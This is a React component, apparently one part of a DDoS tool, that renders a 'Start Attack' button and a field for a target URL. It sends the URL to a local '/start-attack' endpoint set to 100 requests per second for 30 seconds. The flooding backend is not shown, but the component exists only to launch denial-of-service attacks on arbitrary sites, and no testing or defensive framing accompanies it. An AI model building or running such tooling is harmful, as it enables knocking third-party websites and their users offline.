import axios from 'axios';
import { useState } from 'react';

function StartDDOSAttackButton() {
  const [targetUrl, setTargetUrl] = useState('');
  const [message, setMessage] = useState('');

  const startAttack = async () => {
    try {
      const response = await axios.post('http://localhost:3000/start-attack', {
        targetUrl: targetUrl,
        requestsPerSecond: 100,  // you can customize these values
        durationSeconds: 30
      });

      setMessage(response.data);  // "Started attack on..."
    } catch (error) {
      console.error(error);
      setMessage('Error starting attack.');
    }
  };

  return (
    <div>
      <input
        type="text"
        placeholder="Enter Target URL"
        value={targetUrl}
        onChange={(e) => setTargetUrl(e.target.value)}
      />
      <button onClick={startAttack}>Start Attack</button>

      {message && <p>{message}</p>}
    </div>
  );
}

export default StartDDOSAttackButton;
